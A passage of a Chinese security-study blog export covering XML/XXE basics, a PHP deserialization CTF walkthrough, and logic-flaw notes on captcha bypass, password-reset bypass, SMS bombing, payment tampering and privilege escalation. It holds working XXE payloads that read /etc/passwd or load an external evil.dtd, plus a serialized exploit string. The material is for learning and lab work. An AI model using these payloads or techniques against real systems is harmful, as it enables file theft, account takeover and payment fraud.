{"meta":{"title":"Al0nez's Bolg","subtitle":"我与春风皆过客,你携秋水揽星河","description":null,"author":"Al0nez","url":"https://Al0nez.github.io","root":"/"},"pages":[{"title":"分类&标签","date":"2021-09-10T02:30:39.000Z","updated":"2021-09-10T02:33:48.948Z","comments":true,"path":"tags/index.html","permalink":"https://al0nez.github.io/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"XML学习","slug":"XML学习","date":"2021-09-22T07:07:29.000Z","updated":"2021-09-22T07:08:44.736Z","comments":true,"path":"2021/09/22/XML学习/","link":"","permalink":"https://al0nez.github.io/2021/09/22/XML%E5%AD%A6%E4%B9%A0/","excerpt":"要学习XXE漏洞，所以先学习一下XML","text":"要学习XXE漏洞，所以先学习一下XML 什么是 XML？ XML 指可扩展标记语言（EXtensible Markup Language）。 XML 是一种很像HTML的标记语言。 XML 的设计宗旨是传输数据，而不是显示数据。 XML 标签没有被预定义。您需要自行定义标签。 XML 被设计为具有自我描述性。 XML 是 W3C 的推荐标准。 XML 和 HTML 之间的差异XML 不是 HTML 的替代。 XML 和 HTML 为不同的目的而设计： XML 被设计用来传输和存储数据，其焦点是数据的内容。 HTML 被设计用来显示数据，其焦点是数据的外观。 HTML 旨在显示信息，而 XML 旨在传输信息。 XML树结构XML文档实例1234567&lt;?xml version=&#x27;1.0&#x27; encoding=&#x27;utf-8&#x27;?&gt;&lt;note&gt; &lt;to&gt;Tove&lt;/to&gt; &lt;form&gt;Jani&lt;/form&gt; &lt;heading&gt;Reminder&lt;/heading&gt; &lt;body&gt;Don&#x27;t forget me this weekend!&lt;/body&gt;&lt;/note&gt; 1&lt;?xml version=&#x27;1.0&#x27; encoding=&#x27;utf-8&#x27;?&gt; 这是XML的声明，定义了XML的版本和编码。 1&lt;note&gt;&lt;/note&gt; 这是XML的根元素，XML必须要包含根元素，根元素是其他元素的父元素。 1234&lt;to&gt;Tove&lt;/to&gt; &lt;form&gt;Jani&lt;/form&gt; &lt;heading&gt;Reminder&lt;/heading&gt; &lt;body&gt;Don&#x27;t forget me this weekend!&lt;/body&gt; 位于根元素中的就是其子元素，相同层级上的子元素成为同胞 XML语法XML声明XML声明文件是可选部分，如果存在需要放在第一行 1&lt;?xml version=&#x27;1.0&#x27; encoding=&#x27;utf-8&#x27;?&gt; 所有的元素必须要包含一个关闭标签12&lt;to&gt;&lt;/to&gt;&lt;br /&gt; **注:**声明文件不是XML的一部分，所有不需要关闭标签 XML 标签对大小写敏感XML对大小写敏感所有必须要使用一样的大小写 12&lt;Message&gt;这是错误的&lt;/message&gt;&lt;message&gt;这是正确的&lt;/message&gt; XML必须要正确嵌套XML不像HTML一样，标签没有正确嵌套也可以。XML中标签必须被正确嵌套 1&lt;b&gt;&lt;i&gt;This text is bold and italic&lt;/i&gt;&lt;/b&gt; XML属性必须加引号XML中也可以拥有属性，但是必须要加引号，不加引号是错误的。 12&lt;note date=&quot;12/11/2007&quot;&gt;&lt;/note&gt; 实体引用XML中&lt;是有特殊意义的，它代表一个新元素的开始，所以如果你将&lt;放入XML元素中会发生错误 1&lt;message&gt;if salary &lt; 1000 then&lt;/message&gt; &lt;!--会生成XML错误--&gt; 为了避免这样的错误，XML规定了使用引用实体代替这些特殊字符 在 XML 中，有 5 个预定义的实体引用： 注释：在 XML 中，只有字符 “&lt;” 和 “&amp;” 确实是非法的。大于号是合法的，但是用实体引用来代替它是一个好习惯。 XML的注释1&lt;!--XML注释--&gt; XML中的空格会被保留HTML会将代码中的多个空格合并为一个，而XML不会 123456789HTML:hello word====&gt;hello wordXML:hello word=====&gt;hello word XML元素XML文档包含XML元素 什么是XML元素XML 元素指的是从（且包括）开始标签直到（且包括）结束标签的部分。 一个元素可以包含： 其他元素 文本 属性 或混合以上所有… XML 命名规则XML 元素必须遵循以下命名规则： 名称可以包含字母、数字以及其他的字符 名称不能以数字或者标点符号开始 名称不能以字母 xml（或者 XML、Xml 等等）开始 名称不能包含空格 可使用任何名称，没有保留的字词。 XML属性XML元素具有属性，属性可以提供元素以外的东西。属性名和元素名一样XML都没有规定，自己定义就行。 属性通常提供不属于数据组成部分的信息。在下面的实例中，文件类型与数据无关，但是对需要处理这个元素的软件来说却很重要： 1&lt;file type=&quot;gif&quot;&gt;computer.gif&lt;/file&gt; XML属性必须加引号XML属性可以使用单引号也可以使用双引号，或者是XML实体 123&lt;person sex = &quot;female&quot;&gt;&lt;/person&gt;&lt;person sex = &#x27;female&#x27;&gt;&lt;/person&gt;&lt;person sex = &quot;George &amp;quot;Shotgun&amp;quot; Ziegler&quot;&gt;&lt;/person&gt; 避免XML属性在XML中，能够使用元素尽量不要使用元素。 1234&lt;person sex=&quot;female&quot;&gt;&lt;firstname&gt;Anna&lt;/firstname&gt;&lt;lastname&gt;Smith&lt;/lastname&gt;&lt;/person&gt; 12345&lt;person&gt;&lt;sex&gt;female&lt;/sex&gt;&lt;firstname&gt;Anna&lt;/firstname&gt;&lt;lastname&gt;Smith&lt;/lastname&gt;&lt;/person&gt; 因使用属性而引起的一些问题： 属性不能包含多个值（元素可以） 属性不能包含树结构（元素可以） 属性不容易扩展（为未来的变化） 不要做这样的蠢事（这不是 XML 应该被使用的方式）： 12&lt;note day=&quot;10&quot; month=&quot;01&quot; year=&quot;2008&quot; to=&quot;Tove&quot; from=&quot;Jani&quot; heading=&quot;Reminder&quot; body=&quot;Don&#x27;t forget me this weekend!&quot;&gt;&lt;/note&gt; 当XML需要是用ID进行标识XML元素的时候可以使用属性进行标识，其他时候请尽量使用元素。 XML验证拥有正确语法的 XML 被称为”形式良好”的 XML。 通过 DTD 验证的XML是”合法”的 XML。 验证XML文档合法的 XML 文档是”形式良好”的 XML 文档，这也符合文档类型定义（DTD）的规则： 12345678&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&lt;!DOCTYPE note SYSTEM &quot;Note.dtd&quot;&gt;&lt;note&gt;&lt;to&gt;Tove&lt;/to&gt;&lt;from&gt;Jani&lt;/from&gt;&lt;heading&gt;Reminder&lt;/heading&gt;&lt;body&gt;Don&#x27;t forget me this weekend!&lt;/body&gt;&lt;/note&gt; 在上面的实例中，DOCTYPE 声明是对外部 DTD 文件的引用。下面的段落展示了这个文件的内容。 DTD 的目的是定义 XML 文档的结构。它使用一系列合法的元素来定义文档结构： 12345678&lt;!DOCTYPE note[&lt;!ELEMENT note (to,from,heading,body)&gt;&lt;!ELEMENT to (#PCDATA)&gt;&lt;!ELEMENT from (#PCDATA)&gt;&lt;!ELEMENT heading (#PCDATA)&gt;&lt;!ELEMENT body (#PCDATA)&gt;]&gt; DTDDTD的作用是用来定义XML文档的合法构建模块 DTD可以被声明在XML文档内，也可以通过外部引用来调用 内部的DOCTYPE声明如果DTD被定义到XML文档内部 1!DOCTYPE root-element [element-declarations]&gt; XML文档实例 1234567891011121314&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE note [&lt;!ELEMENT note (to,from,heading,body)&gt;&lt;!ELEMENT to (#PCDATA)&gt;&lt;!ELEMENT from (#PCDATA)&gt;&lt;!ELEMENT heading (#PCDATA)&gt;&lt;!ELEMENT body (#PCDATA)&gt;]&gt;&lt;note&gt;&lt;to&gt;Tove&lt;/to&gt;&lt;from&gt;Jani&lt;/from&gt;&lt;heading&gt;Reminder&lt;/heading&gt;&lt;body&gt;Don&#x27;t forget me this weekend&lt;/body&gt;&lt;/note&gt; !DOCTYPE note定义了文档的类型，以[为开始]结束。其实就是note是根元素 !ELEMENT note 定义了note元素中的子元素:”to、from、heading,、body” !ELEMENT to定义to元素为#PCDATA 类型 !ELEMENT from定义from元素为 #PCDATA类型 !ELEMENT heading定义heading 元素为 #PCDATA类型 !ELEMENT body定义body 元素为 #PCDATA类型 外部文档声明DTD位于XML文件的外部，那么它应通过下面的语法被封装在一个 DOCTYPE 定义中： 1&lt;!DOCTYPE root-element SYSTEM &quot;filename&quot;&gt; 外部引用 12345678&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE note SYSTEM &quot;note.dtd&quot;&gt;&lt;note&gt; &lt;to&gt;Tove&lt;/to&gt; &lt;from&gt;Jani&lt;/from&gt; &lt;heading&gt;Reminder&lt;/heading&gt; &lt;body&gt;Don&#x27;t forget me this weekend!&lt;/body&gt;&lt;/note&gt; 这是包含 DTD 的 “note.dtd” 文件： 12345&lt;!ELEMENT note (to,from,heading,body)&gt;&lt;!ELEMENT to (#PCDATA)&gt;&lt;!ELEMENT from (#PCDATA)&gt;&lt;!ELEMENT heading (#PCDATA)&gt;&lt;!ELEMENT body (#PCDATA)&gt; PCDATAPCDATA 的意思是被解析的字符数据（parsed character data）。 可把字符数据想象为 XML 元素的开始标签与结束标签之间的文本。 PCDATA 是会被解析器解析的文本。这些文本将被解析器检查实体以及标记. 文本中的标签会被当作标记来处理，而实体会被展开。 不过，被解析的字符数据不应当包含任何 &amp;、&lt; 或者 &gt; 字符；需要使用 &amp;amp;、&amp;lt; 以及 &amp;gt; 实体来分别替换它们。 CDATACDATA 的意思是字符数据（character data）。 CDATA 是不会被解析器解析的文本。在这些文本中的标签不会被当作标记来对待，其中的实体也不会被展开。 DTD元素在一个 DTD 中，元素通过元素声明来进行声明。 声明一个元素123&lt;!ELEMENT element-name category&gt;或&lt;!ELEMENT element-name (element-content)&gt; 空元素空元素通过使用类别关键字EMPTY进行声明 1&lt;!ELEMENT element-name EMPTY&gt; 实例: 123&lt;!ELEMENT br EMPTY&gt; &lt;!--br是元素名--&gt;XML example:&lt;br /&gt; 只有 PCDATA 的元素只有PCDATA的元素通过圆括号中的#PCDATA进行声明 123&lt;!ELEMENT element-name (#PCDATA)&gt;实例&lt;!ELEMENT from (#PCDATA)&gt; 带有任何内容的元素通过ANY声明的元素，可以包含任何可解析数据的组合 123&lt;!ELEMNET element-name ANY&gt;实例&lt;!ELEMENT note ANY&gt; DTD中的一些重要的关键字： DOCTYPE（DTD的声明） ENTITY（实体的声明） SYSTEM、PUBLIC（外部资源申请） DTD实体实体是用于定义引用普通文本或特殊字符的快捷方式的变量。 实体引用是对实体的引用。 实体可在内部或外部进行声明。 内部实体声明1&lt;!ENTITY entity-name &quot;entity-value&quot;&gt; 实例 123&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY&gt;&lt;!ENTITY xxe &quot;Thinking&quot;&gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt; &lt;!--注意这里调用实体需要&amp;xxe;--&gt; 一个实体由三部分构成：&amp;符号、实体名称、分号(；)，这里&amp;不管在GET还是在POST中都需要进行URL编码，因为是使用参数传入XML的，&amp;符号会被认为是参数间的连接符号。 外部实体声明XML中对数据的引用称为实体，实体中有一类叫外部实体，用来引入外部资源，有SYSTEM和PUBLIC两个关键字，表示实体来自本地计算机还是公共计算机，外部实体的引用可以借助各种协议，比如如下的三种： 123file:///path/to/file.exthttp://urlphp://filter/read=convert.base64-encode/resource=conf.php 实体声明 1&lt;!ENTITY entity-name SYSTEM &quot;URI/URL&quot;&gt; 外部引用可支持http，file等协议，不同的语言支持的协议不同，但存在一些通用的协议，具体内容如下所示： 实例 12345678&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE note [ &lt;!ELEMENT name ANY&gt;&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;note&gt; &lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/note&gt; 这种写法则调用了本地计算机的文件/etc/passwd，XML内容被解析后，文件内容便通过&amp;xxe被存放在了name元素中，造成了敏感信息的泄露。 参数实体声明123&lt;!ENTITY % entity-name &quot;entity-value&quot;&gt;or&lt;!ENTITY % entity-name SYSTEM “URI”&gt; 示例： 1234&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY % xxe SYSTEM &quot;http://xxx.xxx.xxx/evil.dtd&quot; &gt;]&gt;&lt;foo&gt;&amp;evil;&lt;/foo&gt; 外部evil.dtd中的内容。 1&lt;!ENTITY evil SYSTEM “file:///c:/windows/win.ini” &gt; 引用公共实体1&lt;!ENTITY entity-name PUBLIC &quot;public_ID&quot; &quot;URI&quot;&gt; 参考链接 https://www.cnblogs.com/zhaijiahui/p/9147595.html https://www.runoob.com/xml/xml-tutorial.html","categories":[],"tags":[{"name":"XML","slug":"XML","permalink":"https://al0nez.github.io/tags/XML/"},{"name":"DTD","slug":"DTD","permalink":"https://al0nez.github.io/tags/DTD/"},{"name":"XXE","slug":"XXE","permalink":"https://al0nez.github.io/tags/XXE/"}]},{"title":"37WEB漏洞-反序列化之PHP","slug":"37WEB漏洞-反序列化之PHP","date":"2021-09-21T02:38:17.000Z","updated":"2021-09-21T05:59:55.362Z","comments":true,"path":"2021/09/21/37WEB漏洞-反序列化之PHP/","link":"","permalink":"https://al0nez.github.io/2021/09/21/37WEB%E6%BC%8F%E6%B4%9E-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BPHP/","excerpt":"目前只看得懂PHP的反序列化，java没有学过，等学到了再看","text":"目前只看得懂PHP的反序列化，java没有学过，等学到了再看 前言 PHP 反序列化原理未对用户输入的序列化字符串进行检测，导致攻击者可以控制反序列化过程，从而导致代码执行，SQL 注入，目录遍历等不可控后果。在反序列化的过程中自动触发了某些魔术方法。当进行反序列化的时候就有可能会触发对象中的一些魔术方法。 魔术方法 serialize() //将一个对象转换成一个字符串 unserialize() //将字符串还原成一个对象 1触发：unserialize 函数的变量可控，文件中存在可利用的类，类中有魔术方法 __construct() //创建对象时触发 __destruct() //对象被销毁时触发 __call() //在对象上下文中调用不可访问的方法时触发 __callStatic() //在静态上下文中调用不可访问的方法时触发 __get() //用于从不可访问的属性读取数据 __set() //用于将数据写入不可访问的属性 __isset() //在不可访问的属性上调用 isset()或 empty()触发 __unset() //在不可访问的属性上使用 unset()时触发 __invoke() //当脚本尝试将对象调用为函数时触发 其他魔术方法1https://www.cnblogs.com/20175211lyz/p/11403397.html 基础 无类序列化将对象转换为字符串的过程称为序列化 1234567891011&lt;?php$key = &#x27;zpzp&#x27;;$num = 123;echo serialize($key); //将对象转换为字符串echo &#x27;&lt;br/&gt;&#x27;;echo serialize($num); //将对象转换为字符串?&gt; &gt;&gt;&gt;&gt;&gt;&gt;&gt;s:4:&quot;zpzp&quot;; //其中s代表的是数据类型,4代表的是数据长度，&quot;zpzp&quot;代表数据内容i:123; //同理,i代表的是int,不过int类型没有长度 反序列化将字符串转换为对象的过程称为反序列化 123456&lt;?php$key = &#x27;s:5:&quot;hello&quot;;&#x27;;echo unserialize($key); //将字符串转换为对象?&gt; &gt;&gt;&gt;&gt;hello 有类1234567891011121314151617181920212223242526272829303132333435&lt;?phpclass ABC&#123; public $test; function __construct()&#123; //对象被创建时触发 $test =1; echo &#x27;调用了构造函数&lt;br&gt;&#x27;; &#125; function __destruct()&#123; //对象被销毁时触发 echo &#x27;调用了析构函数&lt;br&gt;&#x27;; &#125; function __wakeup()&#123; //调用unserialize函数时触发 echo &#x27;调用了苏醒函数&lt;br&gt;&#x27;; &#125;&#125;echo &#x27;创建对象 a&lt;br&gt;&#x27;;$a = new ABC;echo &#x27;序列化&lt;br&gt;&#x27;;$a_ser=serialize($a);echo $a_ser;echo &quot;&lt;br/&gt;&quot;;echo &#x27;反序列化&lt;br/&gt;&#x27;;$a_unser = unserialize($a_ser);echo &#x27;对象快要死了！&#x27;;?&gt; &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;创建对象 a调用了构造函数序列化O:3:&quot;ABC&quot;:1:&#123;s:4:&quot;test&quot;;N;&#125;反序列化调用了苏醒函数对象快要死了！调用了析构函数调用了析构函数 可以看到当我们创建了对象a时，自动调用了__construct函数，然后当我们调用反序列化函数unserialize自动调用了__wakeup函数，当程序结束的时候自动调用了__destruct函数。这就是类中魔术方法的触发条件。当然这里没有举例出调用serialize时触发的魔术函数，它是__sleep函数。 演示案例先搞一把 PHP 反序列化热身题稳住-无类问题-本地test.php文件内容： 12345678910&lt;?phperror_reporting(0);include &quot;flag.php&quot;;$KEY = &quot;xiaodi&quot;;$str = $_GET[&#x27;str&#x27;];if (unserialize($str) === &quot;$KEY&quot;)&#123;echo &quot;$flag&quot;;&#125;show_source(__FILE__); flag.php文件内容: 123&lt;?php$flag=&quot;&#123;abcdefghigjl&#125;&quot;;?&gt; URL： 1http://127.0.0.1/xlh/test.php?str=s:6:&quot;xiaodi&quot;; 最后顶一把网鼎杯 2020 青龙大真题舒服下-有类魔术方法触发-实例源码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081&lt;?php include(&quot;flag.php&quot;); highlight_file(__FILE__); class FileHandler &#123; protected $op; protected $filename; protected $content; function __construct() &#123; $op = &quot;1&quot;; $filename = &quot;/tmp/tmpfile&quot;; $content = &quot;Hello World!&quot;; $this-&gt;process(); &#125; public function process() &#123; if($this-&gt;op == &quot;1&quot;) &#123; $this-&gt;write(); &#125; else if($this-&gt;op == &quot;2&quot;) &#123; $res = $this-&gt;read(); $this-&gt;output($res); &#125; else &#123; $this-&gt;output(&quot;Bad Hacker!&quot;); &#125; &#125; private function write() &#123; if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) &#123; if(strlen((string)$this-&gt;content) &gt; 100) &#123; $this-&gt;output(&quot;Too long!&quot;); die(); &#125; $res = file_put_contents($this-&gt;filename, $this-&gt;content); if($res) $this-&gt;output(&quot;Successful!&quot;); else $this-&gt;output(&quot;Failed!&quot;); &#125; else &#123; $this-&gt;output(&quot;Failed!&quot;); &#125; &#125; private function read() &#123; $res = &quot;&quot;; if(isset($this-&gt;filename)) &#123; $res = file_get_contents($this-&gt;filename); &#125; return $res; &#125; private function output($s) &#123; echo &quot;[Result]: &lt;br&gt;&quot;; echo $s; &#125; function __destruct() &#123; if($this-&gt;op === &quot;2&quot;) $this-&gt;op = &quot;1&quot;; $this-&gt;content = &quot;&quot;; $this-&gt;process(); &#125; &#125; function is_valid($s) &#123; for($i = 0; $i &lt; strlen($s); $i++) if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125)) return false; return true;&#125; if(isset($_GET&#123;&#x27;str&#x27;&#125;)) &#123; $str = (string)$_GET[&#x27;str&#x27;]; if(is_valid($str)) &#123; $obj = unserialize($str); &#125; &#125; 查看代码可以看出来，GET方式传入序列化的str字符串，str字符串中每一个字符的ASCII范围在32到125之间，然后对其反序列化。当执行unserialize函数时，会调用__destruct函数。 123456function __destruct() &#123; if($this-&gt;op === &quot;2&quot;) $this-&gt;op = &quot;1&quot;; $this-&gt;content = &quot;&quot;; $this-&gt;process();&#125; 这里===代表强类型比较，需要数值和类型都相等才是相等。所有如果我们这里输入2或者’ 2’都可以绕过。绕过以后就会进入process()函数。 12345678910public function process() &#123; if($this-&gt;op == &quot;1&quot;) &#123; $this-&gt;write(); &#125; else if($this-&gt;op == &quot;2&quot;) &#123; $res = $this-&gt;read(); $this-&gt;output($res); &#125; else &#123; $this-&gt;output(&quot;Bad Hacker!&quot;); &#125;&#125; 在process函数中，op==”2”是弱类型比较==，数值相等就是想相等，所有我们之前的输入和这里是相等的，然后就会执行read函数。 1234567private function read() &#123; $res = &quot;&quot;; if(isset($this-&gt;filename)) &#123; $res = file_get_contents($this-&gt;filename); &#125; return $res;&#125; read函数会根据filename读取文件。然后执行output函数将读到的内容进行输出。 整个利用思路就很明显了，还有一个需要注意的地方是，$op,$filename,$content三个变量权限都是protected，而protected权限的变量在序列化的时会有%00*%00字符，%00字符的ASCII码为0，就无法通过上面的is_valid函数校验。 这里绕过方法就是修改熟悉为public，php7.1+版本对属性类型不敏感，本地序列化的时候将属性改为public进行绕过即可 所以最后我们的代码是 12345678910&lt;?phpclass FileHandler&#123; public $op=&#x27; 2&#x27;;//源码告诉我们 op 为 1 时候是执行写入为 2 时执行读 public $filename=&quot;flag.php&quot;;//文件开头调用的是 flag.php public $content=&quot;xd&quot;; //随便写的，因为要三个参数&#125;$flag = new FileHandler();$flag_1 = serialize($flag);echo $flag_1;?&gt; 这里序列化一下是：所以最后的结果就是这个 1O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;s:2:&quot; 2&quot;;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;s:2:&quot;xd&quot;;&#125; 涉及资源： http://www.dooccn.com/php/ https://www.ctfhub.com/#/challenge https://ctf.bugku.com/challenges#flag.php https://cgctf.nuptsast.com/challenges#Web https://www.cnblogs.com/20175211lyz/p/11403397.html","categories":[],"tags":[{"name":"Web","slug":"Web","permalink":"https://al0nez.github.io/tags/Web/"},{"name":"小迪学习笔记","slug":"小迪学习笔记","permalink":"https://al0nez.github.io/tags/%E5%B0%8F%E8%BF%AA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"PHP反序列化","slug":"PHP反序列化","permalink":"https://al0nez.github.io/tags/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}]},{"title":"36WEB漏洞-逻辑越权之验证码与Token及接口","slug":"36WEB漏洞-逻辑越权之验证码与Token及接口","date":"2021-09-21T02:36:48.000Z","updated":"2021-09-21T05:59:36.705Z","comments":true,"path":"2021/09/21/36WEB漏洞-逻辑越权之验证码与Token及接口/","link":"","permalink":"https://al0nez.github.io/2021/09/21/36WEB%E6%BC%8F%E6%B4%9E-%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E9%AA%8C%E8%AF%81%E7%A0%81%E4%B8%8EToken%E5%8F%8A%E6%8E%A5%E5%8F%A3/","excerpt":"😆😆😆😆😆😆","text":"😆😆😆😆😆😆 验证安全 验证码安全分类 图片，手机或邮箱，语音，视频，操作等 原理 验证生成或验证过程中的逻辑问题 危害 账户权限泄漏，短信轰炸，遍历，任意用户操作等 漏洞 客户端回显，验证码复用，验证码爆破，绕过等 验证码识别插件工具使用 Pkav_Http_Fuzz(不好用) captcha-killer（burp插件） reCAPTCHA 1https://www.cnblogs.com/cwkiller/p/12659549.html 服务端验证 第一次输入正确的验证码，之后使用同样的验证码进行发包，从而成功绕过。这是因为服务器在判断的时候，只是将第一次进行验证，然后生成一个session，验证结束后没有删除session，导致之后可以一直使用该验证码进行验证。 客户端验证 通过调用JS代码进行验证码的验证工作。可以查看前端JS代码，或者network中加载的JS文件来确定是不是前端验证。 token 安全原理 Token是服务端生成的一串字符串，以作客户端进行请求的一个令牌，当第一次登录后，服务器生成一个Token便将此Token返回给客户端，以后客户端只需带上这个Token前来请求数据即可，无需再次带上用户名和密码。 token 客户端回显 token在前端有回显，可以获取到 1https://blog.csdn.net/weixin_44110913/article/details/109368455 token无回显 看看是否有规律，是否可以爆破，一般都不行 接口安全问题调用，遍历，未授权，篡改等 调用案例：短信轰炸 遍历案列：UID 等遍历 callback 回调 JSONP 未授权访问：与越权漏洞区别 Jboss 未授权访问 Jenkins 未授权访问 ldap 未授权访问 Redis 未授权访问 elasticsearch 未授权访问 MenCache 未授权访问 Mongodb 未授权访问 Rsync 未授权访问 Zookeeper 未授权访问 Docker 未授权访问 涉及资源： https://www.lanzous.com/i1z2s3e https://www.cnblogs.com/nul1/p/12071115.html https://github.com/c0ny1/captcha-killer/releases/tag/0.1.2 https://github.com/bit4woo/reCAPTCHA/releases/tag/v1.0","categories":[],"tags":[{"name":"Web","slug":"Web","permalink":"https://al0nez.github.io/tags/Web/"},{"name":"小迪学习笔记","slug":"小迪学习笔记","permalink":"https://al0nez.github.io/tags/%E5%B0%8F%E8%BF%AA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"逻辑越权","slug":"逻辑越权","permalink":"https://al0nez.github.io/tags/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83/"}]},{"title":"35WEB漏洞-逻辑越权之找回机制及接口爆破","slug":"35WEB漏洞-逻辑越权之找回机制及接口爆破","date":"2021-09-21T02:36:28.000Z","updated":"2021-09-21T06:00:10.675Z","comments":true,"path":"2021/09/21/35WEB漏洞-逻辑越权之找回机制及接口爆破/","link":"","permalink":"https://al0nez.github.io/2021/09/21/35WEB%E6%BC%8F%E6%B4%9E-%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E6%89%BE%E5%9B%9E%E6%9C%BA%E5%88%B6%E5%8F%8A%E6%8E%A5%E5%8F%A3%E7%88%86%E7%A0%B4/","excerpt":"😆😆😆😆😆😆","text":"😆😆😆😆😆😆 找回重置机制客户端回显点击获取验证码后，会在数据包中回显验证码内容，而不需要去接收手机或者邮箱的验证码，这种称为客户端回显。 Response 状态值当我们随便输入一个验证码，发送给服务器，服务器会返回一个错误的标志来告诉客户端，如果我们将返回的数据包进行拦截，那么如果客户端验证的这个结果不是依据服务器的话，就会成功验证。 验证码爆破当验证码长度较短的时候，比如说4位数字，就可以使用爆破工具进行验证码爆破 找回流程绕过一般我们在找回密码时，第一步会先验证手机的验证码，第一步通过后，第二步会进行修改密码。我们抓取第二步修改密码的数据包，当我们随机修改一个账号的密码时，直接将第二步的数据包复制上去，就可以绕过第一步验证流程。 接口调用乱用短信轰炸，来电轰炸等 涉及资源： http://downcode.com/downcode/j_16621.shtml https://pan.baidu.com/s/1P73QFmEhY6f350CvmnOJNg 提取码：xiao https://pan.baidu.com/s/1N963jFjTefNc6Gnso-RHmw 提取码：xiao https://www.mozhe.cn/bug/detail/K2sxTTVYaWNncUE1cTdyNXIyTklHdz09bW96aGUmozhe","categories":[],"tags":[{"name":"Web","slug":"Web","permalink":"https://al0nez.github.io/tags/Web/"},{"name":"小迪学习笔记","slug":"小迪学习笔记","permalink":"https://al0nez.github.io/tags/%E5%B0%8F%E8%BF%AA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"逻辑越权","slug":"逻辑越权","permalink":"https://al0nez.github.io/tags/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83/"}]},{"title":"34WEB漏洞-逻辑越权之支付数据篡改安全","slug":"34WEB漏洞-逻辑越权之支付数据篡改安全","date":"2021-09-21T02:36:10.000Z","updated":"2021-09-21T06:00:15.667Z","comments":true,"path":"2021/09/21/34WEB漏洞-逻辑越权之支付数据篡改安全/","link":"","permalink":"https://al0nez.github.io/2021/09/21/34WEB%E6%BC%8F%E6%B4%9E-%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E6%94%AF%E4%BB%98%E6%95%B0%E6%8D%AE%E7%AF%A1%E6%94%B9%E5%AE%89%E5%85%A8/","excerpt":"😆😆😆😆😆😆","text":"😆😆😆😆😆😆 登录应用功能点安全问题检测 存在登录功能的位置 危害 不用账号密码，直接登录 登录点暴力破解如果数据包传输的账号密码没有加密或加密方式已知，可以尝试暴力破解 HTTP/HTTPS 传输HTTP是明文传输的，也就是说我们在进行密码登录的时候，账号和密码是没有加密的。这种我们是可以直接进行爆破的。 而HTTPS在传输过程中是进行加密的，在进行登录的时候如果我们无法得知他的加密形式，是无法爆破的，当然有的时候也没有加密，具体情况可以碰到了看一下数据包。 Cookie 脆弱点验证代码审计 看看Cookie有无可操作的值，调整那些跟你登录页面有关的项，看是否会影响功能。如修改“user”的值 Session 固定点测试验证密文比对安全测试数据篡改安全问题挖洞技巧：支付漏洞之总结1https://www.secpulse.com/archives/67080.html 商品购买流程：选择商品和数量-选择支付及配送方式-生成订单编号-订单支付选择-完成支付 常见篡改参数：商品编号 ID，购买价格，购买数量，支付方式，订单号，支付状态等 常见修改方法：替换支付，重复支付，最小额支付，负数支付，溢出支付，优惠券支付等 涉及资源 https://www.zblogcn.com/zblogphp/ https://github.com/huyuanzhi2/password_brute_dictionary https://pan.baidu.com/s/1fJaW23UdcXcSFigX0-Duwg 提取码：xiao https://pan.baidu.com/s/1fJaW23UdcXcSFigX0-Duwg 提取码：xiao","categories":[],"tags":[{"name":"Web","slug":"Web","permalink":"https://al0nez.github.io/tags/Web/"},{"name":"小迪学习笔记","slug":"小迪学习笔记","permalink":"https://al0nez.github.io/tags/%E5%B0%8F%E8%BF%AA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"逻辑越权","slug":"逻辑越权","permalink":"https://al0nez.github.io/tags/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83/"}]},{"title":"33WEB漏洞-逻辑越权之水平垂直越权全解","slug":"33WEB漏洞-逻辑越权之水平垂直越权全解","date":"2021-09-21T02:35:56.000Z","updated":"2021-09-21T06:00:21.295Z","comments":true,"path":"2021/09/21/33WEB漏洞-逻辑越权之水平垂直越权全解/","link":"","permalink":"https://al0nez.github.io/2021/09/21/33WEB%E6%BC%8F%E6%B4%9E-%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83%E5%85%A8%E8%A7%A3/","excerpt":"😆😆😆😆😆😆","text":"😆😆😆😆😆😆 越权 水平越权原理 通过更换的某个 ID 之类的身份标识，从而使 A 账号获取（修改、删除等）B 账号数据。 垂直越权原理 使用低权限身份的账号，发送高权限账号才能有的请求，获得其高权限的操作。 未授权访问原理 通过删除请求中的认证信息后重放该请求，依旧可以访问或者完成操作。 案例演示Pikachu-本地水平垂直越权演示（漏洞成因）水平越权 首先我们查看koby用户的信息 我们抓包发现参数有username，我们试着把username修改为其他用户，能不能达到一个水平越权的效果呢。 1234567891011121314GET 